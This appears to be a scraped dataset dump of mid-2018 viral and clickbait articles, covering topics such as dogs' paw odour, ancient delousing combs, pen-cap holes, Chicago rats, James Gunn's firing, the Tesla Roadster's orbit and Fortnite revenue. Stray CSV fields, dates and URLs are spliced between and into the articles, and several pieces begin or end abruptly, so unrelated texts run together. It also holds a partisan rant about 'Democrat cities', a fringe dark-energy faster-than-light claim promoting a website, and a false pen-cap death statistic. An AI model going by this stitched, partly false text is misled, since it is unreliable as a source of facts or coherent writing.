Late sleeper? Blame your genes.","Ever wake up to a numb, dead arm? Here’s what’s happening.",

Retired LA police officer has the perfect solution to stop nosy
paranoid white people from calling cops on innocent blacks

In the past year, there have been multiple high-profile incidents of white people getting caught threatening to call the cops on people of color for engaging in everyday, normal activities: swimming in a pool ; eating lunch ; using food stamps; feeding the homeless, to name just a few recent examples.

Retired Sgt. Cheryl Dorsey—who worked for the LAPD for 20 years—tells Raw Story there’s a simple solution.

“There are policies in place for people who abuse 911. Let’s say someone goes fishing on a lake, even though there’s a sign that says ‘No fishing on the lake,’ and they get stuck needing a SEAL team to rescue them or whatever. They charge you for resources.”

The same can be true for calling the authorities on people who are not breaking the law.

“Let’s say somebody calls you and you suspect it’s BS … charge that person for the salary of every emergency responder who’s on the scene because of it,” Dorsey said.

She recalls that back during her time on the force, the LAPD would get daily phone calls from what they jokingly referred to as “the Laser Lady.”

“She’d call everyday. She wanted someone to adjust the tin foil on her head! It was kind of funny.”

But there’s nothing funny about the racism that would prompt someone to call the police on a black person doing nothing wrong.

“Police department resources are minimal. Cops don’t have time to go to the scene because there are some black people having a BBQ in a park.”

“It’s such a no brainer. Many people live paycheck to paycheck. If you had to pay the salaries of four cops responding to the scene and a sergeant… well you’d probably think twice.”",Retired LA police officer has the perfect solution to stop nosy paranoid white people from calling cops on innocent blacks,

Ever Wonder Why Your Dog's Paws Sometimes Smell Like
Fritos?
",7/08/2018 14:00,https://www.comicsands.com/why-dogs-paws-smell-fritos-2591884469.html,"Ever caught a good whiff of your dog's paw as it affectionately brushed across your face? Did it smell familiar?

If you said, ""Actually, my Bruno's paw smells like corn chips,"" you're not alone. Many dog owners described the aroma from their dog's paws smelling strangely similar to that of Fritos or even corn tortillas – and there's a reason for it.

People want answers.







Giphy









The Kansas City Star calls the phenomenon, ""Fritos Paws,"" or ""Fritos Feet.""

Dog blogger Beth Meadow wrote an entry for DogTime.com website, saying that many owners love the smell of their furry friend's feet.

This may or may not be a surprise to you, fellow dog owner and dog feet lover. I for one don't understand it. Perhaps because I know all too well what my dogs are walking through every day.













Well-groomed and clean dogs aren't exempt from emitting the smell of Fritos.























The Dogington Post weighed in on the naturally produced odor from a dog, but warned owners may want to take paws (see what we did there?) before getting their noses in contact with their pets' feet.

The culprit for the smell has everything to do with bacteria.

But dog's feet, trampling through the grass and dirt, being licked, with moist folds of skin and fur between the toe pads, are breeding grounds for bacteria and yeast.













The odor-causing microorganisms are very similar to what gives us BO. For dogs, yeast or the bacterium Proteus, which is characteristic of the corn chip smell, could be a causing factor.

Bacterium Pseudomonas could also be contributing to the smell typically associated with what ours noses interpret as a popcorn scent.



While an intense aroma of Fritos Paws is nothing to be overly concerned about, signs like seeing your dog constantly licking its paws and a noticeable inflammation between its toes could be signs of an infection, in which case a trip to the vet might be in order.

The Huffington Post clarified what to look for specifically.

By the way: It's a normal behavior for dogs to lick their paws — it's how they self-clean and remember where they've been throughout the day. Excessive is the keyword.

Now that the pseudo-mystery is solved, one Twitter user cautiously inquired about actual Fritos, and I don't think we want to know the answer.

This 26 Y.O Guy Messages His Mother Who Put Him Up For
Adoption And Her Response Is Unexpected
",7/08/2018 13:00,https://www.boredpanda.com/adopted-man-biological-parents-davismemevoter/,"26-year-old Justin, from Florida, U.S. would definitely agree that it takes guts to finally meet the biological parents who never raised you. Fortunately, he conquered his fear and decided to reach out to his mother, who put him up for adoption many years ago. As it turns out, there was absolutely nothing to be afraid of.

Justin always knew that he was adopted and had tried to find his biological mother before. “It’s something that I had just always been curious about because I had known it my whole life. I wanted to see where I came from, I wanted to see my blood and people who bore a resemblance to me,” he told Bored Panda. Sadly, his search always led nowhere since he only knew two things – her name and that her father is a pastor. Only recently he had a stunning breakthrough, after Justin’s adoptive mother sent him an article about a pastor which she believed to be his grandfather. It took some digging around, but that article helped him to finally track down his mother and connect to her on Facebook. After a few intense days of waiting, her lovely response put a wide smile on his face. Justin found out that his biological parents and two siblings can’t wait to meet him.

Tracking down his parents was the best experience of Justin’s life. He was immediately accepted into the family. “I wasn’t a secret at all to anyone,” he said. His two biological sisters always knew about him. “They were just as ecstatic to meet me as I was them. One of them even cried when she first found out when she was little because she wanted a big brother so bad, haha. They’d never had a big brother and they were stoked! It was so amazing meeting and hugging them. I text all of them every day and we all constantly keep in touch!”

Justin revealed the reason he was put for adoption. “She decided to give me up because she wasn’t able to offer the life she wanted to give me at the time due to her age and circumstances, so she wanted a family that could give me every opportunity available. I thought that was the bravest part. She said every March 8th, (my birthday) she would always wonder what I was doing for my birthday. She thought about me so much. ”

With his beautiful story of reunifiction with his family, Justin wants to encourage other people to not be afraid. ” If there is ANYBODY who is reserved about meeting their biological parents or hesitant to reach out, I implore you to do so. You could be in for the experience of a lifetime. It’s so fulfilling and personally, I feel like my life has come full circle. I think it’s important to see where you come from and appreciate that. It’s the most beautiful thing in the world.”

Researchers Uncover Ancient South American Combs Used For
A Pretty Disgusting Purpose
",7/08/2018 10:00,https://allthatsinteresting.com/south-american-combs,"It might be gross, but if you had the same problem that these people had, you would have wanted the comb as well.

Researchers in South America have discovered that the often ornately constructed ancient combs that they keep finding had a fairly unsavory purpose: delousing.

National Geographic reports that a recent study has found that the double-sided combs unearthed in archaeological digs in northern Chile were indeed used to get rid of lice.

These tiny parasites will bite the human head in order to ingest blood, which leaves the host with an itchy skull. And because these insects are only mere millimeters in size and their eggs are likewise tiny, rooting them all out is quite a chore without some fine-toothed tools like the combs found in Chile.

When lead researcher Bernardo Arriaza magnified the combs that his team had found in the graves of women who lived in the Atacama Desert between about 500 to 1500 A.D., they discovered traces of both dead lice and lice eggs on the comb’s teeth.

Of course, ancient Chileans aren’t the only ones known to delouse their hair with combs.

According to Atlas Obscura, parasitologist Kostas Mumcuoglu and anthropologist Joseph Zias discovered that 8 of the 11 first-century combs they unearthed in the Judean desert contained lice eggs.

“We had assumed that combs were used almost exclusively for cosmetic purposes,” the pair wrote in their original report. “Now it appears that they were also used as de-lousing implements. Indeed, the combs we examined appear to have been designed specifically for de-lousing.”

And why did these ancient peoples seem unwilling to solve the problem by simply shaving off all their hair when lice moved in? As Arriaza told National Geographic, “Vanity is stronger than itching. People prefer to feel ‘lousy’ than bald.”

",7/08/2018 8:00,https://www.iflscience.com/plants-and-animals/wolf-spiders-arent-completely-colorblind-but-they-can-only-make-out-this-one-color/,"The male peacock spider (actually multiple species) is a flamboyant critter that seduces mates with an extravagant display and rainbow-colored behind. It is not particularly surprising, then, that color perception is a massive evolutionary advantage. In 2017, biologists confirmed that unlike the vast majority of arachnids, peacock spiders do indeed see in color.

Now scientists want to know: Does this ability to perceive color extend to their drabbier cousins, the wolf spider? The answer: yes, but only if it is green.

Unlike humans with trichromatic vision, wolf spiders have dichromatic vision. This means that while we can detect red, green, and blue light, these eight-legged creatures can only make out green and ultraviolet light.

George Uetz, a professor of biology at the University of Cincinnati, presented the research with his students at the American Arachnological Society meeting in June. His lab contains 1,200 or so wolf spiders, making it every arachnophobe's worst nightmare but the ideal setting to study spider behavior.

To test wolf spiders' perception of color, the team watched male and female spiders react to a video of a courting spider – a demonstration that usually involves a lot of tapping, bouncing, and twerking. The digitalization of the dance meant the researchers could adjust the color and intensity of both the background and the courting spider.

The female spiders were more forthcoming when there was a high contrast between the courting spider and the background. There was a better response when the video was fixed to monochrome or color, in comparison to the grayscale version. Interestingly, color was also important for the male spiders, the researchers said, who in this scenario are ""eavesdroppers"" – that is, amateur dancers attempting to learn and mimic the other male spiders' mating rituals.

""What we found is that for female spiders, intensity matters more than color,"" Uetz, said in a statement. ""But for male eavesdroppers, color matters, too. That is the odd finding. We didn't expect that at all.""

The ability to make out green as opposed to any other color serves an evolutionary purpose. Mating displays that take place in spring and summer will most likely take place with a green backdrop, and as the researchers found out, spider eyesight appears to change according to the season.

""That makes a lot of sense because when you go out in the early season when the spiders first come out, there are no leaves on the trees so there is broad spectrum light,"" Uetz explained. ""But as the seasons change, leaves come out and everything turns green. Spiders have to be able to see the contrast against a lot of color backgrounds.""

Now, here's a video of a wolf spider doing his best to attract a mate.

According to the theory of relativity, it is not. A new understanding of dark energy and its inflation of the space of our universe with increasing speed may completely change this restriction.

If we should succeed in continuously inverting the dark energy influences to a very limited extent in front of spaceships, the distances to their destinations will get much shorter. And if this elimination of space is very effective, an observer may register a spaceship faster than speed of light, although the spaceship stays within the given limits of the theory of relativity.

The scientific discussion of Henryk Frystacki on the webpage https://www.escape-of-time.com or https://www.frystacki.de shows a simple model to understand the basic principles behind this idea. Even if the model is simple, it is compatible with general relativity and quantum physics.

The assumed stabilization of galaxies by dark matter gets another explanation in this model: an inverted part of dark energy keeps stars and planets on stable tracks.

Kid nearly ruins parents' marriage after saying she found a bra in
her Dad's car but the truth is hilarious

",6/08/2018 8:00,https://www.popsugar.com/family/Little-Girl-Finds-Bra-Dad-Car-45051341,"It's no secret that kids can put a strain on a marriage. Those early years of sleepless nights and short fuses aren't easy, but I didn't realize that those unassuming babies would eventually turn into toddlers who seem hell-bent on actually destroying their parents' relationship. My kid has exposed more white lies than I care to mention, and — although I should be well aware that she's an unreliable narrator — I often take her highly untrustworthy word over my husband's.

It seems I'm not alone in any of this, as one dad posted an exchange on Twitter that nearly ruined his marriage when his 4-year-old daughter apparently outed him for having a bra — that didn't belong to his wife — in his car.

Thankfully, the hilarious misunderstanding has a happy ending:

Kid: Mommy, why is your bra in daddy's car?

Me: What!?

There's a Reason For Holes on The Tops of Pen Caps, And It's
Surprisingly Awesome
",5/08/2018 16:00,https://www.sciencealert.com/why-there-are-holes-in-tops-of-pen-caps-lids-bic,"Sometimes, science is all about the mind-aching big picture. Like the idea that our Universe is just a giant hologram, or that we've actually detected gravitational waves from a neutron star collision. Or that we might not actually have as much free will as we think...

Those are really exciting concepts. But then there are other times when you come across a day-to-day application of technology that's so simple and yet so important, it reminds you what all this innovation is about. Case in point: that ubiquitous hole at the top of your BIC pen cap.

You've probably never given it much thought, or if you have, you've probably brushed it off as some random design feature that regulates air pressure or stops ink from drying out. And, yes, having a hole on their does allow you to close the lid properly without the air pressure issue. But it also serves another simple yet ingenious purpose - reducing the risk of choking deaths.

Turns out it's not just us who love chewing on pen lids - a whole lot of people do it, and that can lead to lids getting accidentally swallowed and lodged in the wind pipe, with potentially fatal consequences.

By simply adding a larger hole to the top of the lid, pen company BIC increased air flow and the chance that people would still be able to breathe even if that happens - a design feature that, quite literally, saves lives.

""In addition to help prevent the pen from leaking, all our BIC caps comply with international safety standards that attempt to minimise the risk of children accidentally inhaling pen caps,"" the company writes on its website. ""Some of these vented caps, like that used for the BIC Cristal, has a little hole in the top to comply with the existing safety standards.""

Roughly 100 people die in the US each year from choking on pen lids, a number that used to be higher, Matt Payton from The Independent reported in 2016. Other pen manufacturers have followed suit and added larger holes to the top of their pens too, he added.

(Note: if you do find yourself or a loved one choking on a pen lid, here are some tips on what to do.)

Not impressed by that beautiful application of technology to our daily lives? Well how about that tiny ""breather hole"" in airplane windows, which has the important job of managing the tension that builds up between internal and external pressure of an aeroplane?

And while you're at it, there's also a simple but awesome reason that plane windows always have rounded edges. Enjoy:

Have you ever been seriously injured in the classroom or in the library? That might sound like an odd question with an obvious answer, but we bet you have!

As you've sorted through a pile of homework papers or dragged your finger along the edges of the pages of a book, we bet that at one time or another you've suddenly felt a jolt of pain. Ouch! What's going on here? Oh no! It's a paper cut!

Although pieces of paper don't otherwise resemble sharp knives, the edges of a piece of paper can at times be razor-sharp. If you've ever gotten a paper cut on your fingertip, you know the pain can feel disproportionate to what seems like a minor cut. So why do paper cuts hurt so badly?

Are you just being a wimp because you can't stand the sting of a paper cut? Nope! There are a few reasons that nearly everyone feels the same way about those annoying, painful paper cuts.

One major reason paper cuts hurt so much is their usual location: your fingertips. You usually don't get paper cuts on your belly, your knees, or your back. If you did, they wouldn't hurt nearly as much. Why?

Your fingertips are very sensitive. They're built to serve as the primary means by which your brain processes your sense of touch. They can feel pressure, pain, and temperature easily. There are more nerve fibers (called nociceptors) per square inch in your fingertips than most other areas of your body.

When you get a paper cut, the paper slices through these nerve fibers, resulting in many pain signals being sent to your brain. If that wasn't bad enough, you'll notice after a paper cut that you can't just stop using your hands until it heals. You constantly need to use your hands and, as you do so, your skin moves and the wound gets pressed and pulled upon, which delays healing and renews the pain you feel each time it happens.

The typical location of paper cuts explains why a paper cut on your fingertip hurts more than a similar cut on your belly or leg. However, a paper cut tends to hurt more than a different kind of cut, like from a knife, on your fingertip. Why is that?

To answer that question, we have to look at the object doing the cutting: the paper. Unlike a knife edge, which is extremely sharp and straight, the edge of a piece of paper is dull and flexible by comparison.

Have you ever tried to cut a piece of meat with a very dull knife or watched someone do it? The knife pulls and tears at the meat rather than slicing cleanly through it. That's what paper does to your fingertip when you get a paper cut. Although you can't really see it with your eyes, the edge of a piece of paper does a lot of microscopic damage to your fingertip when it cuts it.

Adding to the pain is the fact that paper cuts tend to be shallow and bleed little. This means many damaged nerve endings are left exposed near the surface of your skin, where they can be irritated easily, resulting in more pain signals being sent to your brain.

So what can you do when you get a paper cut? Clean it thoroughly and then cover it with a bandage (or a liquid bandage). Keeping the wound closed and covered will help to reduce the amount of irritation the nerve fibers experience, thereby reducing your pain.",Why Does a Paper Cut Hurt So Much?,

",4/08/2018 12:00,https://www.independentsentinel.com/this-city-has-the-distinction-of-being-named-the-rat-capital-of-the-usa/,"In time, Democrat cities tend to become Third World in a number of ways, especially when they are sanctuaries for criminals from foreign lands. One only needs to travel to New York City, LA, or Detroit to see the homeless, including drug addicts and mentally ill, living in squalor, laying in train stations, in front of stores, and elsewhere. Crime is rampant in these cities although some, like New York, fudge statistics. Baltimore bears the distinction of being the most dangerous city in America.

They’re all deeply in debt.

San Francisco was once a must-see location for world travelers but many tourist companies are taking it off the list, partly because of the pounds of human feces in the streets.

RAHM EMANUEL’S CHICAGO, THE ‘RAT CAPITAL’ OF AMERICA

Instead of feces, Chicago, another liberal creation, has rats. It was recently named the ‘rat capital’ of the USA.

A new study published by online apartment search service “RentHop”, found that 50,963 complaints were made to the city last year about troublesome rodents, according to the Daily Mail. That is far more than any other city.

When comparing the number of complaints per 100,000 residents, RentHop said, “Chicago topped the list with 1876.09 complaints per 100,000 residents,” according to the Daily Mail.

“The study also found that the number of complaints made by Chicago residents jumped 55 per cent since 2014.”

New York City came in second with 19,152 complaints, followed by Washington, D.C. (5,036 complaints), and Boston (2,488 complaints).

YOU GET USED TO IT AND THINK IT’S NORMAL

City residents have foolishly accepted it as part of city life.

“It’s part of living in a city,” Norma Rios-Sierra told The Chicago Tribune. “Even during the day, you’ll see them fly through the alley.'”

A spokesperson for the department of health and safety said complaints are not an indicator of the rat population in an area, it only shows Chicagoans care.

Yikes!

That’s not exactly accurate. What it shows is there are a lot of rats. The calls have gone from 42,000 to over 50,000 in one year, suggesting an increase in rats.

There are at least 26 crews baiting rats, but, still the rats keep coming.

“I’ve never seen anything like the rat infestation that we have in Chicago,” said Veterinarian Dr. Dylan Frederickson, noting that he administers treatments to dogs multiple times a year due to rodent activity.

Rat bites “can cause acute kidney failure, which is sometimes fatal,” he said.

Even puddles can be contaminated by the rats..

Chicago has a number of glaring faults. It is still one of the top murder capitals, even over rat infestation, with 290 murders in the city so far this year.

According to CNBC calculations, a $1,000 investment made in early August 2008 would be worth more than $9,222.50 as of August 2, 2018, or over nine times as much, including price appreciation and excluding dividends.

Apple shares hit a historic $1 trillion market cap value on Thursday, becoming the first public U.S. company to ever reach the milestone. The stock briefly hit the $207.05 per share price that was needed to bring Apple to the $1 trillion mark before retreating, CNBC reports .

Apple's all-time stock growth, as of August 2, 2018 at 12:36 p.m. (Click to enlarge.)

While Apple's stock has performed well, any individual stock can over- or under-perform and past returns do not predict future results.

Apple's recent surge allowed the software company to defeat e-commerce giant Amazon in the race to become the first publicly traded U.S. company worth $1 trillion.

Apple stock also soared in May, when Berkshire Hathaway chief executive officer Warren Buffett revealed that his company bought 75 million shares of Apple, adding to the 165.3 million shares it already owned.

Some analysts had concerns about a possible slowdown in iPhone sales after the company's quarterly earnings report showed Apple sold fewer iPhones than expected. But still, in his interview on ""Squawk Box,"" Buffett said long-term investors shouldn't be too concerned about near-term iPhone sales.

""The idea that you're going to spend loads of time trying to guess how many iPhone X ... are going to be sold in a three-month period totally misses the point,"" he said.

If you're looking to invest in the next Apple or considering putting some money in the stock market, experienced investors like Buffett, Mark Cuban and Tony Robbins suggest you start carefully.

Begin with index funds, they say, which hold every stock in an index, offer low turnover rates, attendant fees and tax bills, and fluctuate with the market to eliminate the risk of picking individual stocks.

Here's Who Is Rumored to Replace James Gunn on ‘Guardians of
the Galaxy Vol. 3'

",3/08/2018 8:35,https://comicbook.com/marvel/news/heres-who-is-rumored-to-replace-james-gunn-on-guardians-of-the-g/,"If Marvel does not rehire James Gunn to direct Guardians of the Galay vol. 3 -- which is the safe bet in today's installment of the ever-churning rumor mill surrounding this controversy -- they will likely go outside of their normal circle and hire someone new to Marvel.

According to Variety, while Disney is disinclined to rehire Gunn, the report also seemed to exclude popular fan picks like Taika Waititi, Joe and Anthony Russo, and Jon Favreau.

The explanation is simple enough: those are all superstar directors with a lot of other irons in the fire, and Disney's need to get the Guardians threequel back on track relatively quickly would be complicated by asking them to step away from another project. In some cases, their other projects are also for parent company Disney, which makes the math even harder.

Gunn was fired from the movie in July, after a number of offensive tweets from before his time with Marvel were revived by alt-right provocateur Mike Cernovich and a social media campaign was mounted to have him fired. Cernovich had targeted Gunn due to the director's vocal opposition to U.S. President Donald Trump.

Besides being removed as writer and director of Guardians of the Galaxy vol. 3, Gunn's status on an as-yet-undisclosed project for Sony, which was to be announced at Comic Con International in San Diego, is up in the air. The project's announcement and Gunn's appearance were both cancelled after his firing by Disney.

As pressure mounted on social media ahead of his firing, Gunn had reiterated an earlier apology for the tweets that got him in trouble, originally made before Guardians of the Galaxy went into production. The Guardians of the Galaxy cast and other celebrities have issued statements in support of Gunn, asking for the public to believe him when he says that he has changed in the years since he published the offensive remarks.

Critics have countered that Gunn was ""old enough to know better"" even a decade ago, or that some of the tweets -- which included jokes about rape and pedophilia -- are unforgivable for someone who works at a family-friendly company like Disney. A few outliers and conspiracy theorists have speculated that the jokes indicate Gunn actually is a pedophile or rapist, with former Republican Presidential candidate Ted Cruz suggesting that Gunn ""should be prosecuted"" if the tweets ""are true.""

UPDATE: An earlier version of this story repeated erroneous reports that some Marvel actors had unfollowed Gunn's Twitter account following the firing. We regret the error.

Gunn has said that he understands the business decision Disney made, and reiterated his apology for the jokes, saying that he accepts responsibility for them.

Before working at Disney, Gunn worked on Warner Bros.' live-action Scooby-Doo franchise and with Batman v Superman: Dawn of Justice director Zack Snyder on a remake of George Romero's Dawn of the Dead. His non-franchise films (which include Slither, Super, and Tromeo and Juliet) have tended to be edgy, sexy, violent, and subversive, which at first made him seem like an odd choice to join the safe, predictable Marvel Studios family. A number of these tweets, as well as since-deleted blog posts, came up in interviews and thinkpieces around the time Marvel brought Gunn on board.

Variety suggests that it is likely ""Disney will reach outside the Marvel family to find a director with the kind of offbeat sensibility to handle the comic-book franchise.""

Guardians of the Galaxy vol. 3, which was designed as the final installment with the current crop of Guardians characters, was slated for a 2020 theatrical release, which puts the production up against a wall in terms of finding a competent new director and developing a new script (Gunn had already turned in at least one draft) in time to begin production for the projected release date.",Here's Who Is Rumored to Replace James Gunn on 'Guardians of the Galaxy Vol. 3',

Elon Musk's Tesla Roadster speeds through solar system

The sports car speeding through space could come close to crossing paths with Earth again towards the end of 2020 it has been revealed. The cherry-red electric Tesla Roadster, which blasted off into Space on February 6 onboard the Falcon Heavy rocket, is still soaring near to Earth. But in April this year the Roadster will swing away towards Mars, on an orbital path that will take it beyond the Red Planet and close to the astroid belt. Thereafter Starman will complete a trip around the solar system before flying in-between Earth and Mars in two year’s time, according to the WhereIsRoadster.com tracker.

But the good news for those below is that the odds of the Tesla ever actually crash landing back on Earth are pretty small – about 6 percent in fact. The vehicle will continue to orbit the star at the heart of the solar system for another million years before it crashes into anything. Orbital dynamics experts Hanno Rein, Daniel Tamayo and David Vokrouhlicky, outlined this in their study of the car’s position. In their research paper, titled The random walk of cars and their collision probabilities with planets, the scientists underlined that there is no genuine threat from Starman.

WHEREISROADSTER.COM Tesla Roadster location: The electric car will fly in-between Mars and Earth in 2020

The three experts underlined that it is nigh impossible to precisely chart the Roadster’s position as it sails across the vast expanse of space. Lead author of the study, Mr Rein, said: “Earth is the most likely place the car will crash, followed by Venus, and then the sun.” According to the expert, the Roadster will come “relatively close” to its home planet every 30 years, and its trajectory will shift slightly every time. The Roadster is expected to make it next close encounter with Earth in 2091, when it approaches at a distance similar to that between the planet and its moon.

At its farthest distance from Earth, the roadster will be 1.67 times Earth’s distance from the sun.

Earth is the most likely place the car will crash, followed by Venus, and then the sun Hanno Rein, University of Toronto

The three researchers from the University of Toronto ran countless simulations to come to the conclusion that there is a 6 percent chance of the Roadster crashing into Earth and a 2.5 percent chance of hitting Venus. Mr Rein said: “We’ve not seen any single collision with Mars in 240 simulations, though we continue to run them and see what happens. “The likely outcome is that it will crash, in tens of millions of years, into Earth or Venus or the sun.”

Is owning a dog good for your health?

A new study suggests canine-lovers could be 23% less likely to die from...

",2/08/2018 15:00,https://www.theguardian.com/lifeandstyle/2017/dec/04/is-owning-a-dog-good-for-your-health,"Dogs really are our best friends, according to a Swedish study that says canine ownership could reduce heart disease. A study of 3.4 million people between the ages of 40 and 80 found that having a dog was associated with a 23% reduction in death from heart disease and a 20% lower risk of dying from any cause over the 12 years of the study. Previous studies have suggested dogs relieve social isolation and depression – both linked to an increased risk of heart disease and early death.

The solution



Dog owners show better responses to stress (their blood pressure and pulse rates don’t soar), have higher levels of physical activity and slightly lower cholesterol levels. The American Heart Association was sufficiently swayed by a review of dozens of studies to release a statement in 2013 saying that owning a dog “was probably” associated with a reduced risk of heart disease. Their reluctance to more strongly endorse dog ownership is because most studies are what is called observational – researchers note an association, but can’t prove causation. This means that other factors might explain why dog owners are healthier than, say, goldfish owners – for example, perhaps only people who are fit in the first place buy pets that need daily walkies.

Tove Fall, an epidemiologist and the lead author of this latest study, says they tried their best to allow for any differences in education, existing ill-health and lifestyles between those with and without dogs. The study found the biggest positive impact of having a dog was on people living alone. “It seems that a dog can be a substitute for living with other people in terms of reducing the risk of dying,” says Fall. “Dogs encourage you to walk, they provide social support and they make life more meaningful. If you have a dog, you interact more with other people. If you do get ill and go into hospital and you have a dog, there’s a huge motivation to try to get back home.”

Of course, getting a dog and watching it from your sofa while you eat fatty food is not going to reduce your risk of heart disease. And a toy dog may look cute, but won’t have any effect either. Fall’s study showed the most health benefits came from having retrievers or pointers. Until her German shorthaired pointer died last year, she ran 10km with her most days. “In Sweden, we have one of the lowest rates of dog ownership in Europe,” says Fall, who has recently got a new puppy. “Maybe this will increase the acceptance that dogs are important to people.”",Is owning a dog good for your health?,

Celebrity chef Gordon Ramsay has revealed the moving reason his kids were his motivation to lose 50 pounds of weight and how you can do it too...

Gordon Ramsay’s weight loss was all thanks so a very simple change in his lifestyle.

The celebrity chef was speaking on the Today show in America when he showed off his impressive 50 pound weight loss – that’s 22 bags of sugar!

Gordon revealed that portion control was at the heart of his weight loss and changing when he ate as well as how much he ate.

As a chef, it is obviously near impossible to steer clear of things like carbs and fattening ingredients like cream and butter that deliver heaps of flavour.

After all if you’re heading out to a restaurant for a date night do you really want to be thinking about a low-fat or low-calorie dinner? You’ll probably be going for the steak and chips with a dessert to finish and a large glass (or two) of wine – we would too!

So instead of restricting his diet in terms of the things he could eat, Gordon restricts his eating to five small meals a day.

He explained: ‘I’m very good now at eating five times a day, but small amounts as opposed to a big breakfast, big lunch and big dinner.’

Gordon’s weight loss was all down to portion control and changing when he eats

Gordon also offered some health advice and urged people to think about the quality of the food they are eating over the quality.

He said: ‘If Americans toned down the sort of quantity and honed in on the quality, you’d feel so much better. So it’s about sort-of eating better, but eating less at the same time.’

This is something Brits can relate too as well given obesity is at an all time high and one in five children in Year 6 at school were classified as obese last year.

The motivation behind Gordon’s weight loss is also very heartwarming and something all parents can relate to.

Gordon explained: ‘My father passed of a heart attack at 53. That man never ever ate in my restaurant, and it pains me today to think that.’

Gordon with his four children and wife Tana

The father-of-four stressed that he didn’t want his own children to go through the same pain, which is why he is taking his health more seriously.

Gordon’s wife Tana also had a part to play as she joked: ‘Gordon’s famous for being blunt. I just gave him a little bit of his own medicine and basically suggested that he was getting a little wide around his middle.’",Gordon Ramsay’s weight loss is all down to ONE simple trick,

Epic Games has seen its stock rise and rise this year as the free-to-play battle royale blockbuster continues to dominate all things gaming.

And as millions of addicted players across the globe plough endless hours into the title, where 100 battle it out online at a time in a fight to the death, the money just keeps rolling in thanks to buyable add-ons.

The game has now earned more than $1.2billion (£900million) since its launch in September and is on track for $2bn by year end.

And new analysis from Bloomberg suggests that with Fortnite’s success, Epic Games is now worth over $8.5 billion.

This value is based on all of Epic’s revenues, including its Unreal Engine which many developers use to make games for consoles.

Tim Sweeney, the founder and CEO of Epic Games, created the company in his parent’s basement 27 years ago.

Sweeney is currently the controlling shareholder of Epic Games.

Bloomberg said that making Fortnite free to play, with in-game purchases, has paid off and made him a billionaire.

Instead of shelling out upwards of £40 for the game, players buy online V-bucks, a virtual currency they can exchange during play for outfits, called skins, celebratory dances or special missions that can cost as much as £20 each.

“On the revenue side, they’ve done something that’s really unique, which is come up with a perception of exclusivity,” said Michael Pachter, a video game analyst at Wedbush Securities Inc.

Many accessories in the Fortnite shop are available on a limited basis, prompting players to buy before coveted items disappear from virtual shelves.

Pachter said: “If you see another player in a leopard skin and go to the store and see it’s no longer available, you think, Shoot, I’ve got to move on it next time.”

While most games hit peak popularity shortly after launch, Fortnite was still drawing millions of new users six months on, thanks to a broadly appealing aesthetic that’s more comic mischief than graphic violence.

Celebrity fans such as rapper Drake have pushed it further into mainstream consciousness.

As a game that’s social, easy to play and hard to master, it’s been a particular hit with school-age kids, raising concerns from teachers and parents reporting obsessive playing during class.

And counselling experts have this week warned parents to limit their kids time with the game as they see a boom in gaming addictions.

Analyst in the Bloomberg piece suggested that if Epic Games were put up for sale, it would be worth around $14billion (£10.6bn) based on similar values that EA, which makes Battlefield, and Activision Blizzard, which makes Call of Duty, are worth.

They also added that even if Fortnite’s momentum slowed down, the company could still expect to earn $1 billion a year from the title’s in-game sales.

New data also released by Sensor Tower recently stated that Fortnite on mobile makes around $2million a day, up from $1.5million earlier this year, thanks to Season 5.",Fortnite SHOCK; You won't believe how much money this game is making,

Chicken was responsible for more illnesses associated with outbreaks of foodborne pathogens than any other food product, according to a new report from the Centers for Disease Control and Prevention. In total, 12% of these illnesses were linked to chicken. After chicken, pork and seeded vegetables caused the most illnesses due to contamination by food borne pathogens, at 10% each.

While chicken led to more illnesses, other foods — fish and dairy — prompted more pathogen outbreaks. To produce its findings, the CDC analyzed 5,760 outbreaks from 2009 to 2015. These outbreaks were responsible for more than 100,000 illnesses — nearly 5,700 of which resulted in hospitalizations, and 145 of which led to deaths.

One particular multi-state outbreak involving salmonella in chicken, which occurred in 2013 and 2014, caused the second most hospitalizations (200 cases) of any single outbreak, exceeded only by a 2015 salmonella outbreak tied to cucumbers (204 hospitalizations).

The poultry industry cries foul over the CDC report

The poultry industry has asked government regulators in recent years to allow chicken producers to ramp up the speed of production lines, arguing this will allow them to maintain competitiveness with international producers. Thus far, the U.S. Department of Agriculture’s Food Safety and Inspection Service has denied these petitions.

“Outside of maybe the nuclear energy industry, the U.S. meat and poultry industry is one of the most heavily regulated industries in the United States,” said Tom Super, spokesman for the National Chicken Council, a trade group that represents chicken farmers and producers. “To say otherwise is either disingenuous, or represents a gross misunderstanding of how the industry operates.”

Because the CDC data are three years old, Super said it did not capture improvements made after the nationwide new poultry inspection system went into effect in 2014. Between 2017 and 2018, the percentage of whole chickens that tested positive for salmonella decreased from 5.42% to 4.9%, according to USDA data. At the same time, however, the share of salmonella-contaminated chicken parts rose from 14.16% to 14.83%.

Consumer advocates argue for more regulation of chicken

Consumer safety advocates argue that more—not less— regulation is needed. “Rather than focusing on schemes to boost industry profits—such as eliminating slaughterhouse line-speed limits—we should be talking about why the U.S. lags so far behind other countries on issues like addressing salmonella contamination in poultry, and what can be done to avoid some of these illnesses and the havoc they wreak on families,” said Thomas Gremillion, director of the Food Policy Institute at the Consumer Federation of America.

In the European Union, the number of illnesses caused by salmonella has decreased between 2008 and 2016, while in the U.S. it has remained higher.

One contributing factor could be how the federal government classifies salmonella. A loophole in food safety laws means that the bacteria isn’t considered an “adulterant” like certain strains of E.coli. When a substance is classified legally as an adulterant it means that food contaminated with it cannot be distributed — other adulterants include sawdust and plastic.

Also see:FDA links salmonella fears to common whey supplier, warns more recalls likely

While food producers are still under scrutiny from the USDA to stamp down on salmonella contamination, positive tests for the bacteria don’t automatically prompt a recall, according to Bill Marler, a Seattle-based lawyer who specializes in cases involving food safety. Instead, a recall only happens if an outbreak of illnesses is confirmed.

“Therefore, the USDA essentially allows companies to produce and sell salmonella- or campylobacter-tainted chicken,” Marler said.

Marler argued that the classification of one strain of E.coli (E.coli 0157) as an adulterant led to a significant decrease in the number of illnesses caused by the pathogen. The strain only earned that classification after an outbreak killed four children and landed 171 other people in the hospital in 1994.

But researchers at the University of Minnesota argued that classifying salmonella as an adulterant would not have the same significantly positive impact on public health, in part because current testing methods are not practical at supporting the level of inspection that would be needed to prevent salmonella-contaminated food from being distributed.",It’s official: This food is the most likely to make you sick,

Of course you have, and it turns out you're not alone, but fear not, fact finders as one of life's biggest fashion mysteries has been solved.

Now, I know some people will definitely be thinking moths. I know I was before I found out the real reason behind the suspicious holes.

Advert 10

But it turns out that the most likely reason for tiny holes around your torso is actually down to your jeans or belt.

CEO of American Giant, Bayard Winthrop, told Today: ""That part of the shirt is a primary abrasion point.

